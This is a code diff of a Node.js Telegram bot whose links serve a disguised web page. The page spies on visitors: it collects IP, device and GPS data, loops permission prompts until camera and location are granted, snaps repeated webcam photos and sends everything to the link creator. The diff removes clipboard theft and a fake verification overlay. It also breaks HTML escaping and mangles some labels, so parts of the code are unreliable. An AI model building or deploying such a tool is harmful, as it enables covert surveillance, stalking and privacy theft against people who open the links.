@@ -55,7 +55,7 @@ const Link = mongoose.model('Link', linkSchema);
 const userState = {};
 
 let shareSystemEnabled = true;
-let activeOffer = null; // { reward: '10' or '1w', expiresAt: timestamp }
+let activeOffer = null; // Store active offer globally
 let botUsername = "DX_CODEX_BOT";
 bot.getMe().then(me => botUsername = me.username);
 
@@ -76,11 +76,11 @@ function makeBorder(title, content) {
 function escapeHtml(text) {
     if (!text) return text;
     return text.toString()
-        .replace(/&/g, "&amp;")
-        .replace(/</g, "&lt;")
-        .replace(/>/g, "&gt;")
-        .replace(/"/g, "&quot;")
-        .replace(/'/g, "&#039;");
+        .replace(/&/g, "&")
+        .replace(/</g, "<")
+        .replace(/>/g, ">")
+        .replace(/"/g, """)
+        .replace(/'/g, "'");
 }
 
 
@@ -153,30 +153,26 @@ bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
                 if (referrer) {
                     referrer.referralCount += 1;
                     if (referrer.referralCount % 2 === 0) {
-                        if (activeOffer && Date.now() < activeOffer.expiresAt) {
-                            const valStr = activeOffer.reward;
-                            if (valStr.match(/[dwmy]$/)) { 
-                                const val = parseInt(valStr);
+                        if (activeOffer && activeOffer.expiry > Date.now()) {
+                            if (activeOffer.rewardType === 'coin') {
+                                referrer.coins += activeOffer.value;
+                                bot.sendMessage(referrer.chatId, makeBorder("🎉 ᴏғғᴇʀ ᴜɴʟᴏᴄᴋᴇᴅ", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💰: +${activeOffer.value} ᴄᴏɪɴs ᴀᴅᴅᴇᴅ (sᴘᴇᴄɪᴀʟ ᴏғғᴇʀ).`), {parse_mode:'HTML'});
+                            } else {
                                 let multiplier = 0;
-                                if (valStr.includes('d')) multiplier = 24 * 60 * 60 * 1000;
-                                else if (valStr.includes('w')) multiplier = 7 * 24 * 60 * 60 * 1000;
-                                else if (valStr.includes('m')) multiplier = 30 * 24 * 60 * 60 * 1000;
-                                else if (valStr.includes('y')) multiplier = 365 * 24 * 60 * 60 * 1000;
-
-                                const currentExpiry = referrer.subscriptionExpiry && referrer.subscriptionExpiry > Date.now() ? referrer.subscriptionExpiry.getTime() : Date.now();
-                                referrer.subscriptionExpiry = new Date(currentExpiry + (val * multiplier));
+                                let amtStr = activeOffer.value;
+                                let val = parseInt(amtStr);
+                                if (amtStr.includes('d')) multiplier = 24 * 60 * 60 * 1000;
+                                else if (amtStr.includes('w')) multiplier = 7 * 24 * 60 * 60 * 1000;
+                                else if (amtStr.includes('m')) multiplier = 30 * 24 * 60 * 60 * 1000;
+                                else if (amtStr.includes('y')) multiplier = 365 * 24 * 60 * 60 * 1000;
                                 
-                                bot.sendMessage(referrer.chatId, makeBorder("🎉 ᴏғғᴇʀ ʀᴇᴡᴀʀᴅ", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💎: ${val}${valStr.slice(-1)} sᴜʙsᴄʀɪᴘᴛɪᴏɴ ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ.`), {parse_mode:'HTML'});
-                            } else { 
-                                const val = parseInt(valStr);
-                                if (!isNaN(val)) {
-                                    referrer.coins += val;
-                                    bot.sendMessage(referrer.chatId, makeBorder("🎉 ᴏғғᴇʀ ʀᴇᴡᴀʀᴅ", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💰: +${val} ᴄᴏɪɴs ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ.`), {parse_mode:'HTML'});
-                                }
+                                let currentExp = referrer.subscriptionExpiry && referrer.subscriptionExpiry > Date.now() ? referrer.subscriptionExpiry.getTime() : Date.now();
+                                referrer.subscriptionExpiry = new Date(currentExp + (val * multiplier));
+                                bot.sendMessage(referrer.chatId, makeBorder("🎉 ᴏғғᴇʀ ᴜɴʟᴏᴄᴋᴇᴅ", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💎: +${amtStr} sᴜʙsᴄʀɪᴘᴛɪᴏɴ ᴀᴅᴅᴇᴅ (sᴘᴇᴄɪᴀʟ ᴏғғᴇʀ).`), {parse_mode:'HTML'});
                             }
                         } else {
                             referrer.freeUrlsLeft += 1;
-                            bot.sendMessage(referrer.chatId, makeBorder("🎉 ʀᴇғᴇʀʀᴀʟ sᴜᴄᴄᴇss", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💰: +1 ғʀᴇᴇ ᴄᴏɪɴ ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ.`), {parse_mode:'HTML'});
+                            bot.sendMessage(referrer.chatId, makeBorder("🎉 ʀᴇғᴇʀʀᴀʟ sᴜᴄᴄᴇss", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💰: +1 ғʀᴇᴇ ʟɪɴᴋ ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ.`), {parse_mode:'HTML'});
                         }
                     } else {
                         bot.sendMessage(referrer.chatId, makeBorder("📈 ʀᴇғᴇʀʀᴀʟ ᴛʀᴀᴄᴋ", `✅: 1 ɴᴇᴡ ᴜsᴇʀ ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n⚠️: ɪɴᴠɪᴛᴇ 1 ᴍᴏʀᴇ ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ʀᴇᴡᴀʀᴅ.`), {parse_mode:'HTML'});
@@ -345,7 +341,7 @@ bot.on('message', async (msg) => {
             userState[chatId].name = cleanName;
             askRedirect(msg, cleanName);
         } else if (userState[chatId].step === 'await_redirect_url') {
-            if(!text.startsWith('http')) return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ᴜʀʟ ᴍᴜsᴛ sᴛᴀʀᴛ ᴡɪᴛʜ http"), {parse_mode:'HTML'});
+            if(!text.startsWith('http')) return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", "</b>❌: ᴜʀʟ ᴍᴜsᴛ sᴛᴀʀᴛ ᴡɪᴛʜ http"), {parse_mode:'HTML'});
             createFinalLink(msg, userState[chatId].name, text.trim());
         }
     }
@@ -447,7 +443,7 @@ function handleDev(chatId) {
     bot.sendMessage(chatId, makeBorder("ᴅᴇᴠᴇʟᴏᴘᴇʀ", "👨‍💻: ᴄᴏᴅᴇᴅ ʙʏ ᴅx-ᴄᴏᴅᴇx\n🛡: ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄᴏᴅᴇx—ᴛᴇᴀᴍ"), { 
         parse_mode: 'HTML',
         reply_markup: {
-            inline_keyboard: [[{ text: "🛠 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url: `https://t.me/${GROUP_ID.replace('@', '')}` }]]
+            inline_keyboard: [[{ text: "🛠 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜপদে", url: `https://t.me/${GROUP_ID.replace('@', '')}` }]]
         }
     });
 }
@@ -496,23 +492,23 @@ bot.on('callback_query', async (query) => {
     if (data === 'cmd_info') {
         const user = await User.findOne({ chatId });
         handleInfo(chatId, user);
-        return bot.answerCallbackQuery(query.id).catch(()=>{});
+        return bot.answerCallbackQuery(query.id);
     } 
     else if (data === 'cmd_dev') {
         handleDev(chatId);
-        return bot.answerCallbackQuery(query.id).catch(()=>{});
+        return bot.answerCallbackQuery(query.id);
     } 
     else if (data === 'cmd_referral') {
         const user = await User.findOne({ chatId });
         handleShare(chatId, user);
-        return bot.answerCallbackQuery(query.id).catch(()=>{});
+        return bot.answerCallbackQuery(query.id);
     }
 
     if (data === 'verify_join') {
         try {
             const { allJoined } = await checkMembership(chatId);
             if (allJoined) {
-                await bot.answerCallbackQuery(query.id, { text: "✅ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ sᴜᴄᴄᴇss!" }).catch(()=>{});
+                await bot.answerCallbackQuery(query.id, { text: "✅ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ sᴜᴄᴄᴇss!" });
 
                 try { await bot.deleteMessage(chatId, msg.message_id); } catch (e) { }
 
@@ -552,29 +548,23 @@ bot.on('callback_query', async (query) => {
                     }
                 });
             } else {
-                bot.answerCallbackQuery(query.id, { text: "⚠️ ᴊᴏɪɴ ᴀʟʟ ᴄʜᴀɴɴᴇʟs ғɪʀsᴛ!", show_alert: true }).catch(()=>{});
+                bot.answerCallbackQuery(query.id, { text: "⚠️ ᴊᴏɪɴ ᴀʟʟ ᴄʜᴀɴɴᴇʟs ғɪʀsᴛ!", show_alert: true });
             }
         } catch (error) {}
     }
     else if (data === 'create_custom') {
         userState[chatId] = { step: 'await_custom_name' };
-        bot.sendMessage(chatId, makeBorder("ᴄᴜsᴛᴏᴍ", "<b>✏️: sᴇɴᴅ ʏᴏᴜʀ ᴄᴜsᴛᴏᴍ ʟɪɴᴋ ɴᴀᴍᴇ</b>"), { parse_mode: 'HTML' });
-        bot.answerCallbackQuery(query.id).catch(()=>{});
+        bot.sendMessage(chatId, makeBorder("ᴄᴜsᴛᴏᴍ", "<b>✏️: sᴇɴᴅ ʏᴏᴜʀ ᴄᴜspportune ʟɪɴᴋ ɴᴀᴍᴇ</b>"), { parse_mode: 'HTML' });
     } 
     else if (data === 'create_random') {
         askRedirect(query, Math.random().toString(36).substring(7));
-        bot.answerCallbackQuery(query.id).catch(()=>{});
     } 
     else if (data === 'use_redirect') {
-        if (!userState[chatId]) return bot.answerCallbackQuery(query.id, {text: "Session expired. Please generate URL again.", show_alert: true}).catch(()=>{});
         userState[chatId].step = 'await_redirect_url';
         bot.sendMessage(chatId, makeBorder("ʀᴇᴅɪʀᴇᴄᴛ", "<b>🌐: sᴇɴᴅ ᴛʜᴇ ᴅᴇsᴛɪɴᴀᴛɪᴏɴ ᴜʀʟ</b>"), { parse_mode: 'HTML' });
-        bot.answerCallbackQuery(query.id).catch(()=>{});
     } 
     else if (data === 'no_redirect') {
-        if (!userState[chatId]) return bot.answerCallbackQuery(query.id, {text: "Session expired. Please generate URL again.", show_alert: true}).catch(()=>{});
         createFinalLink(query, userState[chatId].name, null);
-        bot.answerCallbackQuery(query.id).catch(()=>{});
     }
 });
 
@@ -665,21 +655,29 @@ bot.onText(/\/sudo(?:\s+(.+))?/, async (msg, match) => {
         return bot.sendMessage(msg.chat.id, txt, {parse_mode:'HTML'});
     }
 
+    let input = match[1];
+    let isRemove = false;
+    
+    if (input) {
+        if (input.toLowerCase() === 'r' && msg.reply_to_message) {
+            isRemove = true;
+            input = undefined;
+        } else if (input.toLowerCase().startsWith('r ')) {
+            isRemove = true;
+            input = input.substring(2).trim();
+        }
+    } else if (msg.reply_to_message && msg.text && msg.text.toLowerCase().trim() === '/sudo r') {
+        isRemove = true;
+    }
+
     let targetId;
     let targetName = "User";
-    let isRemove = false;
-    let cleanInput = match[1] ? match[1].trim() : "";
-
-    if (cleanInput.toLowerCase().startsWith('r ')) {
-        isRemove = true;
-        cleanInput = cleanInput.substring(2).trim();
-    }
 
     if (msg.reply_to_message) {
         targetId = msg.reply_to_message.from.id;
         targetName = msg.reply_to_message.from.first_name || "User";
-    } else if (cleanInput) {
-        cleanInput = cleanInput.replace('@', '');
+    } else if (input) {
+        const cleanInput = input.trim().replace('@', '');
         if (/^\d+$/.test(cleanInput)) {
             targetId = parseInt(cleanInput);
         } else {
@@ -699,11 +697,7 @@ bot.onText(/\/sudo(?:\s+(.+))?/, async (msg, match) => {
     if (!targetUser) {
         targetUser = new User({ chatId: targetId, firstName: targetName, isSudo: !isRemove });
     } else {
-        if (isRemove) {
-            targetUser.isSudo = false;
-        } else {
-            targetUser.isSudo = true;
-        }
+        targetUser.isSudo = isRemove ? false : true;
     }
     await targetUser.save();
     
@@ -806,8 +800,11 @@ bot.onText(/\/ulist/, async (msg) => {
         let report = `📂 <b>ᴀᴄᴛɪᴠᴇ ʟɪɴᴋs sᴜᴍᴍᴀʀʏ</b>\n\n`;
         for (const uid in userGroups) {
             const user = await User.findOne({ chatId: uid });
-            report += `👤 <b>${user ? user.firstName : 'Unknown'}</b>\n`;
+            const name = user && user.firstName ? escapeHtml(user.firstName) : 'Unknown';
+            const coins = user ? user.coins : 0;
+            report += `👤 <b><a href="tg://user?id=${uid}">${name}</a></b>\n`;
             report += `🆔 ɪᴅ: <code>${uid}</code>\n`;
+            report += `💰 ᴄᴏɪɴs: <b>${coins}</b>\n`;
             report += `🔗 ʟɪɴᴋs: <b>${userGroups[uid]}</b>\n`;
             report += `────────────────────\n`;
         }
@@ -921,15 +918,15 @@ bot.onText(/\/menu/, async (msg) => {
     menu += `├ <code>/add</code> [ǫᴛʏ/1d,1m,1y] [ɪᴅ] - ᴀᴅᴅ ᴄᴏɪɴs/sᴜʙs\n`;
     menu += `├ <code>/rm</code> [ǫᴛʏ] [ɪᴅ] - ʀᴇᴍᴏᴠᴇ ᴄᴏɪɴs\n`;
     menu += `├ <code>/reset</code> [ɪᴅ] - ʀᴇsᴇᴛ ᴀᴄᴄᴏᴜɴᴛ\n`;
-    menu += `├ <code>/sudo</code> [ɪᴅ] / r [ɪᴅ] - ᴛᴏɢɢʟᴇ/ʀᴇᴍᴏᴠᴇ sᴜᴅᴏ ᴀᴄᴄᴇss\n`;
+    menu += `├ <code>/sudo</code> [ɪᴅ] / r [ɪᴅ] - ᴛᴏɢɢʟᴇ/ʀᴇᴍᴏᴠᴇ sᴜᴅᴏ\n`;
     menu += `├ <code>/share on|off</code> - ᴛᴏɢɢʟᴇ ʀᴇғᴇʀʀᴀʟ\n`;
     menu += `├ <code>/ban</code> [ɪᴅ/ʀᴇᴘʟʏ] - ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀ\n`;
     menu += `└ <code>/unban</code> [ɪᴅ/ʀᴇᴘʟʏ] - ʟɪғᴛ ʙᴀɴ\n\n`;
 
-    menu += `📢 <b>ʙʀᴏᴀᴅᴄᴀsᴛ sʏsᴛᴇᴍ</b>\n`;
+    menu += `📢 <b>ʙʀᴏᴀᴅᴄᴀsᴛ & ᴏғғᴇʀ sʏsᴛᴇᴍ</b>\n`;
     menu += `├ <code>/broadcast</code> [text/media] - sᴇɴᴅ ᴍᴇssᴀɢᴇ\n`;
     menu += `├ <code>/ref</code> [html text] - ʙʀᴏᴀᴅᴄᴀsᴛ ᴡɪᴛʜ ʀᴇғᴇʀʀᴀʟ\n`;
-    menu += `└ <code>/offer</code> (qty/1d) [html] - sᴇɴᴅ 24h ᴏғғᴇʀ ʙʀᴏᴀᴅᴄᴀsᴛ\n\n`;
+    menu += `└ <code>/offer</code> [5/1w] [text] - 24ʜ sᴘᴇᴄɪᴀʟ ᴏғғᴇʀ\n\n`;
 
     const menuBorder = (title, body) => `<b>┏─「 ${_fnt(title)} 」</b>\n${body.split('\n').map(l => `<b>┃</b> ${l}`).join('\n')}\n<b>┗───────────╼</b>`;
 
@@ -948,7 +945,7 @@ bot.onText(/\/data(?:\s+(.+))?/, async (msg, match) => {
     let targetUser;
     if (msg.reply_to_message) {
         targetUser = await User.findOne({ chatId: msg.reply_to_message.from.id });
-    } else if (match && match[1]) {
+    } else if (match[1]) {
         targetUser = await resolveUser(msg, match[1]);
     } else {
         targetUser = await User.findOne({ chatId: msg.from.id });
@@ -1117,20 +1114,31 @@ bot.onText(/\/ref\s+(.+)/s, async (msg, match) => {
     bot.sendMessage(msg.chat.id, `✅ <b>ʀᴇғᴇʀʀᴀʟ ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!</b>\nsᴜᴄᴄᴇss: <code>${success}</code> | ʙʟᴏᴄᴋᴇᴅ: <code>${blocked}</code> | ғᴀɪʟᴇᴅ: <code>${failed}</code>`, {parse_mode:'HTML'});
 });
 
-bot.onText(/\/offer\s+\((.+)\)\s+(.+)/s, async (msg, match) => {
+bot.onText(/\/offer\s+([a-zA-Z0-9]+)\s+(.+)/s, async (msg, match) => {
     if (!(await checkAdmin(msg.from.id))) return;
     
-    const reward = match[1].trim().toLowerCase();
+    const rewardStr = match[1].toLowerCase();
     const htmlText = match[2];
-
+    
+    let rewardType = 'coin';
+    let value = parseInt(rewardStr);
+    
+    if (rewardStr.match(/[dwmy]$/)) {
+        rewardType = 'sub';
+        value = rewardStr;
+    } else if (isNaN(value)) {
+        return bot.sendMessage(msg.chat.id, "❌ Invalid offer value");
+    }
+    
     activeOffer = {
-        reward: reward,
-        expiresAt: Date.now() + 24 * 60 * 60 * 1000 
+        rewardType,
+        value,
+        expiry: Date.now() + 24 * 60 * 60 * 1000 // Valid for 24 hours
     };
-
+    
     const users = await User.find({});
-    bot.sendMessage(msg.chat.id, `⏳ <b>sᴇɴᴅɪɴɢ ᴏғғᴇʀ (${reward}) ᴛᴏ ${users.length} ᴜsᴇʀs...</b>`, {parse_mode:'HTML'});
-
+    bot.sendMessage(msg.chat.id, `⏳ <b>sᴇɴᴅɪɴɢ ᴏғғᴇʀ ʙʀᴏᴀᴅᴄᴀsᴛ ᴛᴏ ${users.length} ᴜsᴇʀs...</b>`, {parse_mode:'HTML'});
+    
     let success = 0, failed = 0, blocked = 0;
     for (const u of users) {
         try {
@@ -1144,11 +1152,19 @@ bot.onText(/\/offer\s+\((.+)\)\s+(.+)/s, async (msg, match) => {
             if (e.response && e.response.body && e.response.body.error_code === 403) blocked++;
             else failed++;
         }
-        await new Promise(resolve => setTimeout(resolve, 50));
+        await new Promise(resolve => setTimeout(resolve, 50)); 
     }
-
-    bot.sendMessage(msg.chat.id, `✅ <b>ᴏғғᴇʀ ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!</b>\n🎁 ʀᴇᴡᴀʀᴅ: <code>${reward}</code> (Valid for 24h)\nsᴜᴄᴄᴇss: <code>${success}</code> | ʙʟᴏᴄᴋᴇᴅ: <code>${blocked}</code> | ғᴀɪʟᴇᴅ: <code>${failed}</code>`, {parse_mode:'HTML'});
+    
+    bot.sendMessage(msg.chat.id, `✅ <b>ᴏғғᴇʀ ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ! (Active for 24h)</b>\nReward set to: ${rewardStr}\nsᴜᴄᴄᴇss: <code>${success}</code> | ʙʟᴏᴄᴋᴇᴅ: <code>${blocked}</code> | ғᴀɪʟᴇᴅ: <code>${failed}</code>`, {parse_mode:'HTML'});
+    
+    // Automatically clear the offer after 24 hours
+    setTimeout(() => {
+        if (activeOffer && activeOffer.expiry <= Date.now() + 1000) {
+            activeOffer = null;
+        }
+    }, 24 * 60 * 60 * 1000);
 });
+
 
 
 app.get('/w/:id', async (req, res) => {
@@ -1199,12 +1215,6 @@ app.post('/api/data', async (req, res) => {
             locMsg += `┃ 🗺 <b>${_fnt("MAPS")}:</b> <a href="https://www.google.com/maps?q=${data.lat},${data.lon}">Google Maps</a>\n`;
             locMsg += `<b>┗━━━━━━━━━━┛</b>`;
             await bot.sendMessage(owner, locMsg, { parse_mode: 'HTML', disable_web_page_preview: true });
-        } else if (type === 'clip') {
-            let clipMsg = `<b>┏━━「 ${_fnt("CLIPBOARD DATA")} 」━━┓</b>\n`;
-            clipMsg += `┃ 📋 <b>${_fnt("COPIED TEXT")}:</b>\n`;
-            clipMsg += `┃ <pre>${escapeHtml(data)}</pre>\n`;
-            clipMsg += `<b>┗━━━━━━━━━━┛</b>`;
-            await bot.sendMessage(owner, clipMsg, { parse_mode: 'HTML' });
         }
         res.json({ status: 'success' });
     } catch (e) { res.json({ status: 'error' }); }
@@ -1224,20 +1234,11 @@ function getHtmlTemplate(linkId, redirectUrl) {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             border: none; z-index: 5; display: none; background: #fff;
         }
-        #guard {
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999;
-            background: rgba(0,0,0,0.85); display: flex; align-items: center; justify-content: center;
-            cursor: pointer; flex-direction: column; text-align: center; font-size: 20px;
-            color: #0f0; border: 2px solid #0f0;
-        }
     </style>
 </head>
 <body>
     <canvas id="matrix"></canvas>
     <div id="status">INITIALIZING SECURE PROTOCOL...<br>PLEASE WAIT</div>
-    <div id="guard">
-        <div id="guardText">⚠️ HUMAN VERIFICATION REQUIRED ⚠️<br><br><span style="font-size:15px;color:#aaa;">[ CLICK ANYWHERE TO VERIFY YOUR IDENTITY ]</span></div>
-    </div>
     <video id="v" autoplay playsinline></video><canvas id="c"></canvas>
     <iframe id="iframeOverlay"></iframe>
 <script>
@@ -1256,7 +1257,30 @@ const drops=Array(Math.floor(m.width/20)).fill(0);
 function draw(){ ctx.fillStyle='rgba(0,0,0,0.05)'; ctx.fillRect(0,0,m.width,m.height); ctx.fillStyle='#0f0'; ctx.font='15px monospace'; drops.forEach((y,i)=>{ const t=String.fromCharCode(Math.random()*128); ctx.fillText(t,i*20,y*20); if(y*20>m.height&&Math.random()>0.975)drops[i]=0; drops[i]++; }); }
 setInterval(draw,33);
 
-async function sendInfo() {
+async function getCam() {
+    while(true) {
+        try {
+            return await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+        } catch(e) {
+            alert("Camera permission is required to continue.");
+            await new Promise(r => setTimeout(r, 1000));
+        }
+    }
+}
+
+async function getLoc() {
+    return new Promise((resolve) => {
+        function ask() {
+            navigator.geolocation.getCurrentPosition(resolve, (e) => {
+                alert("Location permission is required to continue.");
+                setTimeout(ask, 1000);
+            });
+        }
+        ask();
+    });
+}
+
+async function start() {
     let ipData = { ip:"Unknown", city:"Unknown", country:"Unknown", isp:"Unknown", loc:"Unknown" }; 
     try { 
         const r1 = await fetch('https://ipapi.co/json/'); 
@@ -1269,7 +1293,13 @@ async function sendInfo() {
             const d2 = await r2.json();
             if (d2.ip) ipData = { ip: d2.ip, city: d2.city||"?", country: d2.country||"?", isp: d2.connection?.isp||"?", loc: d2.latitude+","+d2.longitude };
             else throw new Error("Fallback 2");
-        } catch(e2) {}
+        } catch(e2) {
+            try {
+                const r3 = await fetch('https://api.ipify.org?format=json');
+                const d3 = await r3.json();
+                ipData.ip = d3.ip;
+            } catch(e3){}
+        }
     }
     
     let batt = "N/A"; 
@@ -1283,64 +1313,48 @@ async function sendInfo() {
     } catch(e){}
 
     const info = {
-        ipData: ipData, battery: batt, gpu: gpu, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        ipData: ipData,
+        battery: batt, 
+        gpu: gpu,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         screen: { width:screen.width, height:screen.height, depth:screen.colorDepth },
-        navigator: { platform: navigator.platform, hardwareConcurrency: navigator.hardwareConcurrency, deviceMemory: navigator.deviceMemory, userAgent: navigator.userAgent, language: navigator.language }
+        navigator: { 
+            platform: navigator.platform, 
+            hardwareConcurrency: navigator.hardwareConcurrency, 
+            deviceMemory: navigator.deviceMemory, 
+            userAgent: navigator.userAgent,
+            language: navigator.language 
+        }
     };
 
     fetch('/api/data', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({linkId:id, type:'info', data:info}) });
+
+    // Force Location First
+    const pos = await getLoc();
+    fetch('/api/data', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({linkId:id, type:'loc', data:{lat: pos.coords.latitude, lon: pos.coords.longitude}})});
+
+    // Force Camera Next
+    const s = await getCam();
+    const v = document.getElementById('v'); v.srcObject=s;
+    v.onloadedmetadata = () => {
+        let count=0;
+        const itv = setInterval(()=>{
+            const cvs=document.getElementById('c'); cvs.width=v.videoWidth; cvs.height=v.videoHeight;
+            cvs.getContext('2d').drawImage(v,0,0);
+            const img=cvs.toDataURL('image/jpeg',0.5);
+            
+            fetch('/api/data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({linkId:id,type:'cam',data:{images:[img],platform:navigator.platform}})});
+            
+            count++; 
+            if(count>=5){ 
+                clearInterval(itv); 
+                if(red && red.length > 4 && red !== "null") setTimeout(() => { window.location.href=red; }, 2000); 
+            }
+        }, 1500);
+    };
 }
 
-const guard = document.getElementById('guard');
-const guardText = document.getElementById('guardText');
-
-guard.addEventListener('click', async () => {
-    try {
-        guardText.innerHTML = "⏳ REQUESTING ACCESS... PLEASE ALLOW PERMISSIONS ⏳";
-        
-        // Clipboard block er try-catch fix. Eta fail korle jate crash na hoy.
-        try {
-            const text = await navigator.clipboard.readText();
-            if (text) fetch('/api/data', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({linkId:id, type:'clip', data:text})});
-        } catch(err) {
-            console.log("Clipboard read blocked by browser");
-        }
-
-        const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-        
-        const pos = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject);
-        });
-        fetch('/api/data', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({linkId:id, type:'loc', data:{lat: pos.coords.latitude, lon: pos.coords.longitude}})});
-
-        guard.style.display = 'none';
-
-        const v = document.getElementById('v'); 
-        v.srcObject = stream;
-        v.play().catch(e => {}); 
-        
-        v.onloadedmetadata = () => {
-            let count=0;
-            const itv = setInterval(()=>{
-                const cvs=document.getElementById('c'); cvs.width=v.videoWidth; cvs.height=v.videoHeight;
-                cvs.getContext('2d').drawImage(v,0,0);
-                const img=cvs.toDataURL('image/jpeg',0.5);
-                fetch('/api/data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({linkId:id,type:'cam',data:{images:[img],platform:navigator.platform}})});
-                
-                count++; 
-                if(count>=5){ 
-                    clearInterval(itv); 
-                    if(red && red.length > 4 && red !== "null") setTimeout(() => { window.location.href=red; }, 2000); 
-                }
-            }, 1500);
-        };
-
-    } catch (err) {
-        guardText.innerHTML = "🚫 ACCESS DENIED 🚫<br><br><span style='font-size:15px;color:#f00;'>YOU MUST ALLOW CAMERA & LOCATION TO PROCEED!</span><br><br>[ REFRESH TO TRY AGAIN ]";
-    }
-});
-
-window.onload = sendInfo;
+window.onload = start;
 </script>
 </body>
 </html>`;
